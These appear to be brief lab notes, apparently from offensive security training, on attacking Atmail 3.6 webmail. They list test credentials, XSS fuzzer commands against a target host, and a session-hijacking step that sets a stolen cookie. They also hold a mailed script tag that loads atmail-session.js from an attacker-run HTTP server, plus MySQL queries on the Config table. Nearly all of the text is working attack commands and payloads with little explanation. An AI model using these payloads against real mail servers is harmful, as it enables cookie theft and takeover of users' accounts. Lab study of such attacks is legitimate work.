### Atmail 3.6
```
admin@offsec.local    : 123456
attacker@offsec.local : 123456
wget http://htmlpurifier.org/live/smoketests/xssAttacks.xml
```

### XSS attack
```
python xss-webmail-fuzzer.py -t admin@offsec.local -f attacker@offsec.local -s 192.168.100.34 -c plain -j onebyone_main -r 2
python xss-webmail-fuzzer.py -t admin@offsec.local -f attacker@offsec.local -s 192.168.100.34 -c plain -j onebyone_main -r 13
```


### Session hijacking 
```
Inspeccionador -> Console
javascript:void(document.cookie="atmail6=1fp0fjq4aa8sm5if934b62ptv6"); 

python -m SimpleHTTPServer 8000
python atmail_sendmail.py 192.168.100.34 '<script src="http://192.168.100.12:8000/atmail-session.js"></script>
```

### MySQL
```
select * from Config where keyName="tmpFolderBasename";
select * from Config where keyName="tmpFolderBasename";
```
